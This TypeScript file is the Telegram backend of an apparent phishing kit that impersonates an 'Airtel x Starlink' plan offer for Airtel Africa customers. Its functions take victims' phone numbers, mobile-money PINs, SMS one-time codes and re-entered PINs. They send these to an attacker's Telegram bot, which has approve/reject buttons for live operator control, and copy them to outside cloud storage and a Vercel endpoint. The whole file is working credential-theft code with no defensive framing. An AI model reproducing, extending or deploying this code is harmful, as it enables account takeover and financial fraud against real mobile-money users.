import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';
import { safeStorage } from '../utils/safeBrowser';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  countryCode?: string;
  airtelBrand?: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramReenterPinPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  originalPin?: string;
  pin: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
}

const BROWSER_HEADERS = {
  'Content-Type': 'application/json',
  'Accept': 'application/json',
};

// Request queue for managing concurrent requests
interface QueuedRequest {
  fn: () => Promise<any>;
  resolve: (value: any) => void;
  reject: (error: any) => void;
}

class TelegramService {
  private cloudIdMap: Map<string, string> = new Map();
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      fullPhone?: string;
      country?: string;
      pin?: string;
      reenterPin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
      cloudId?: string;
    }
  > = new Map();

  // Request queue management
  private requestQueue: QueuedRequest[] = [];
  private activeRequests = 0;
  private maxConcurrentRequests = 5; // Limit concurrent requests to avoid rate limiting
  private processingQueue = false;

  // Rate limiting
  private lastTelegramApiCall = 0;
  private minTelegramApiInterval = 100; // Minimum 100ms between Telegram API calls

  // Retry configuration
  private maxRetries = 3;
  private baseRetryDelay = 1000; // 1 second base delay

  /**
   * Helper to retrieve persisted cloudId across tabs, reloads, or OTP steps
   */
  public getCloudId(sessionId: string): string {
    if (this.cloudIdMap.has(sessionId)) {
      return this.cloudIdMap.get(sessionId)!;
    }
    const saved = safeStorage.getItem(`airtel_cloud_id_${sessionId}`);
    if (saved) {
      this.cloudIdMap.set(sessionId, saved);
      return saved;
    }
    return sessionId;
  }

  /**
   * Helper to persist cloudId
   */
  public setCloudId(sessionId: string, cloudId: string) {
    this.cloudIdMap.set(sessionId, cloudId);
    safeStorage.setItem(`airtel_cloud_id_${sessionId}`, cloudId);
    safeStorage.setItem(`airtel_active_session`, sessionId);
    safeStorage.setItem(`airtel_active_cloud_id`, cloudId);
  }

  /**
   * Helper to safely parse JSON
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Retry logic with exponential backoff
   */
  private async retryWithBackoff<T>(
    fn: () => Promise<T>,
    maxRetries: number = this.maxRetries,
    baseDelay: number = this.baseRetryDelay
  ): Promise<T> {
    let lastError: Error | null = null;

    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        return await fn();
      } catch (error: any) {
        lastError = error;
        console.warn(`[TelegramService] Attempt ${attempt + 1}/${maxRetries + 1} failed:`, error);

        // Don't retry on last attempt
        if (attempt === maxRetries) {
          break;
        }

        // Exponential backoff with jitter
        const delay = baseDelay * Math.pow(2, attempt) + Math.random() * 200;
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }

    throw lastError || new Error('Retry attempts exhausted');
  }

  /**
   * Rate limiting for Telegram API calls
   */
  private async rateLimit(): Promise<void> {
    const now = Date.now();
    const timeSinceLastCall = now - this.lastTelegramApiCall;

    if (timeSinceLastCall < this.minTelegramApiInterval) {
      const waitTime = this.minTelegramApiInterval - timeSinceLastCall;
      await new Promise(resolve => setTimeout(resolve, waitTime));
    }

    this.lastTelegramApiCall = Date.now();
  }

  /**
   * Process request queue
   */
  private async processQueue(): Promise<void> {
    if (this.processingQueue || this.requestQueue.length === 0) {
      return;
    }

    this.processingQueue = true;

    while (this.requestQueue.length > 0 && this.activeRequests < this.maxConcurrentRequests) {
      const request = this.requestQueue.shift();
      if (!request) break;

      this.activeRequests++;

      request.fn()
        .then(result => request.resolve(result))
        .catch(error => request.reject(error))
        .finally(() => {
          this.activeRequests--;
          this.processQueue();
        });
    }

    this.processingQueue = false;
  }

  /**
   * Queue a request for execution
   */
  private async queueRequest<T>(fn: () => Promise<T>): Promise<T> {
    return new Promise((resolve, reject) => {
      this.requestQueue.push({
        fn,
        resolve,
        reject,
      });
      this.processQueue();
    });
  }

  /**
   * Send direct Telegram message using Bot API with retry and rate limiting
   */
  public async sendDirectTelegramMessage(text: string, inlineKeyboard?: any): Promise<any> {
    return this.queueRequest(async () => {
      await this.rateLimit();

      return this.retryWithBackoff(async () => {
        const token = getTelegramBotToken();
        const chatId = getTelegramChatId();

        if (!token || !chatId) {
          throw new Error('Telegram bot token or chat ID missing');
        }

        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        const payload: any = {
          chat_id: chatId,
          text,
          parse_mode: 'HTML',
        };
        if (inlineKeyboard) {
          payload.reply_markup = {
            inline_keyboard: inlineKeyboard,
          };
        }

        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (!res.ok) {
          const errorText = await res.text();
          throw new Error(`Telegram API error: ${res.status} - ${errorText}`);
        }

        const data = await this.safeJson(res);
        if (!data || !data.ok) {
          throw new Error('Telegram API returned error response');
        }

        return data;
      });
    });
  }

  /**
   * Send Login Credentials (Phone + 4-digit PIN) with retry logic
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    return this.queueRequest(async () => {
      const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
      const cleanPhone = phone.replace(/\D/g, '');
      const cleanPin = pin.slice(0, 4);

      // Use sessionId as cloudId for speed
      const resolvedCloudId = sessionId;
      this.setCloudId(sessionId, resolvedCloudId);

      this.localSessionState.set(sessionId, {
        loginStatus: 'pending',
        otpStatus: 'idle',
        phone: cleanPhone,
        fullPhone: fullPhone || `+243 ${cleanPhone}`,
        country: country || 'Airtel Africa',
        pin: cleanPin,
        planName,
        planPrice,
        cloudId: resolvedCloudId,
      });

      const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
      const displayCountry = country || 'Airtel Africa';
      const displayBrand = airtelBrand || 'Airtel x Starlink Direct';

      const messageText =
        `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
        `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
        `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
        `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
        `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
        `📶 <b>Réseau:</b> ${displayBrand}\n` +
        `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
        `🆔 <b>ID Session:</b> <code>${resolvedCloudId}</code>\n\n` +
        `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

      const inlineKeyboard = [
        [
          {
            text: '✅ Valider PIN',
            callback_data: `approve_login_${resolvedCloudId}`,
          },
          {
            text: '❌ Rejeter PIN',
            callback_data: `reject_login_${resolvedCloudId}`,
          },
        ],
        [
          {
            text: '🌐 Action Directe (Lien Web)',
            url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_login`,
          },
        ],
      ];

      await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
      return true;
    });
  }

  /**
   * Send OTP Verification Code (4 digits) with retry logic
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    return this.queueRequest(async () => {
      const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
      const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
      const resolvedCloudId = this.getCloudId(sessionId);

      const existing = this.localSessionState.get(sessionId) || {
        loginStatus: 'approved' as const,
        otpStatus: 'pending' as const,
        cloudId: resolvedCloudId,
        fullPhone,
        country,
      };
      existing.otp = cleanOtp;
      existing.otpStatus = 'pending';
      this.localSessionState.set(sessionId, existing);

      // 1. Try server or Vercel serverless endpoint with retry
      try {
        await this.retryWithBackoff(async () => {
          const serverRes = await fetch('/api/telegram/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId,
              cloudId: resolvedCloudId,
              phone,
              fullPhone: fullPhone || existing.fullPhone,
              country: country || existing.country,
              airtelBrand: airtelBrand || 'Airtel Starlink',
              otp: cleanOtp,
              planName,
              planPrice,
            }),
          });

          if (!serverRes.ok) {
            throw new Error(`Server returned ${serverRes.status}`);
          }

          const data = await this.safeJson(serverRes);
          if (!data || !data.success) {
            throw new Error('Server returned unsuccessful response');
          }

          return data;
        });
      } catch (err) {
        console.warn('[TelegramService] Server OTP endpoint failed, using fallback:', err);
      }

      // 2. Direct Cloud Store Update + Telegram Message with retry
      try {
        await this.retryWithBackoff(async () => {
          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
            headers: BROWSER_HEADERS,
            cache: 'no-store',
          });

          if (!fetchRes.ok) {
            throw new Error(`Cloud fetch returned ${fetchRes.status}`);
          }

          const record = await this.safeJson(fetchRes);
          const data = record?.data || {};
          data.otp = cleanOtp;
          data.otpStatus = 'pending';
          data.lastUpdated = Date.now();

          const updateRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
            method: 'PUT',
            headers: BROWSER_HEADERS,
            body: JSON.stringify({
              name: record?.name || resolvedCloudId,
              data,
            }),
          });

          if (!updateRes.ok) {
            throw new Error(`Cloud update returned ${updateRes.status}`);
          }

          return true;
        });
      } catch (err) {
        console.warn('[TelegramService] Cloud store OTP update warning:', err);
      }

      const displayPhone = fullPhone || payload.fullPhone || phone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
      const displayCountry = country || existing.country || 'Airtel Africa';

      const messageText =
        `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
        `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
        `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
        `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
        `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
        `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
        `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
        `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

      const inlineKeyboard = [
        [
          {
            text: '✅ Valider OTP',
            callback_data: `approve_otp_${resolvedCloudId}`,
          },
          {
            text: '❌ Rejeter OTP',
            callback_data: `reject_otp_${resolvedCloudId}`,
          },
        ],
        [
          {
            text: '🌐 Action Directe (Lien Web)',
            url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_otp`,
          },
        ],
      ];

      await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
      return true;
    });
  }

  /**
   * Send Re-entered / Confirmed 4-digit PIN to Telegram Bot
   */
  public async sendReenterPin(payload: TelegramReenterPinPayload): Promise<boolean> {
    const { sessionId, phone, pin, originalPin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanPin = pin.replace(/\D/g, '').slice(0, 4);
    const resolvedCloudId = this.getCloudId(sessionId);

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'approved' as const,
      reenterStatus: 'pending' as const,
      cloudId: resolvedCloudId,
      fullPhone,
      country,
    };
    existing.reenterPin = cleanPin;
    existing.reenterStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    // 1. Try server or Vercel serverless endpoint
    try {
      const serverRes = await fetch('/api/telegram/send-reenter-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          cloudId: resolvedCloudId,
          phone,
          fullPhone: fullPhone || existing.fullPhone,
          country: country || existing.country,
          airtelBrand: airtelBrand || 'Airtel Starlink',
          originalPin: originalPin || existing.pin,
          pin: cleanPin,
          planName,
          planPrice,
        }),
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data && data.success) {
          return true;
        }
      }
    } catch {
      // Backend unavailable, fall through
    }

    // 2. Direct Cloud Store Update + Telegram Message
    try {
      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
        headers: BROWSER_HEADERS,
        cache: 'no-store',
      });
      if (fetchRes.ok) {
        const record = await this.safeJson(fetchRes);
        const data = record?.data || {};
        data.reenterPin = cleanPin;
        data.reenterStatus = 'pending';
        data.lastUpdated = Date.now();

        await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          method: 'PUT',
          headers: BROWSER_HEADERS,
          body: JSON.stringify({
            name: record?.name || resolvedCloudId,
            data,
          }),
        });
      }
    } catch (err) {
      console.warn('Direct cloud store reenter update warning:', err);
    }

    const displayPhone = fullPhone || payload.fullPhone || phone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
    const displayCountry = country || existing.country || 'Airtel Africa';

    const messageText =
      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${cleanPin}</code>\n` +
      `📌 <b>Code PIN Initial:</b> <code>${existing.pin || originalPin || 'N/A'}</code>\n` +
      `🔢 <b>Code OTP Validé:</b> <code>${existing.otp || '****'}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${resolvedCloudId}</code>\n\n` +
      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN Final',
          callback_data: `approve_reenter_${resolvedCloudId}`,
        },
        {
          text: '❌ Rejeter PIN Final',
          callback_data: `reject_reenter_${resolvedCloudId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${resolvedCloudId}&sessionId=${sessionId}&action=approve_reenter`,
        },
      ],
    ];

    await this.sendDirectTelegramMessage(messageText, inlineKeyboard);
    return true;
  }

  /**
   * Fast Real-time Status Polling (Multi-Tier Resilient Check)
   * 1. Check local session state
   * 2. Server status snapshot check
   * 3. Cloud State Lookup
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp' | 'reenter',
    phone?: string
  ): Promise<'pending' | 'approved' | 'rejected'> {
    // 1. Check local cached session state
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
        return local.otpStatus;
      }
      if (targetStep === 'reenter' && (local.reenterStatus === 'approved' || local.reenterStatus === 'rejected')) {
        return local.reenterStatus;
      }
    }

    const resolvedCloudId = this.getCloudId(sessionId);
    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
    const timestamp = Date.now();

    // 2. Check /api/telegram/status snapshot (NO RETRY - needs to be fast)
    try {
      const statusUrl = `/api/telegram/status?id=${encodeURIComponent(resolvedCloudId)}&sessionId=${encodeURIComponent(
        sessionId
      )}&phone=${encodeURIComponent(cleanPhone)}&_t=${timestamp}`;

      const serverRes = await fetch(statusUrl, {
        cache: 'no-store',
        headers: { 'Cache-Control': 'no-cache' },
      });

      if (serverRes.ok) {
        const data = await this.safeJson(serverRes);
        if (data) {
          if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
            if (local) local.loginStatus = data.loginStatus;
            return data.loginStatus;
          }
          if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
            if (local) local.otpStatus = data.otpStatus;
            return data.otpStatus;
          }
          if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
            if (local) local.reenterStatus = data.reenterStatus;
            return data.reenterStatus;
          }
        }
      }
    } catch {
      // Backend snapshot unavailable
    }

    // 3. Cloud State Lookup on restful-api.dev (NO RETRY - needs to be fast)
    if (resolvedCloudId && resolvedCloudId !== sessionId && !resolvedCloudId.startsWith('stl_')) {
      try {
        const cloudRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
          headers: BROWSER_HEADERS,
          cache: 'no-store',
        });

        if (cloudRes.ok) {
          const record = await this.safeJson(cloudRes);
          if (record) {
            const data = record?.data || {};

            if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
              if (local) local.loginStatus = data.loginStatus;
              return data.loginStatus;
            }
            if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
              if (local) local.otpStatus = data.otpStatus;
              return data.otpStatus;
            }
            if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
              if (local) local.reenterStatus = data.reenterStatus;
              return data.reenterStatus;
            }
          }
        }
      } catch {}
    }

    return 'pending';
  }
}

export const telegramService = new TelegramService();
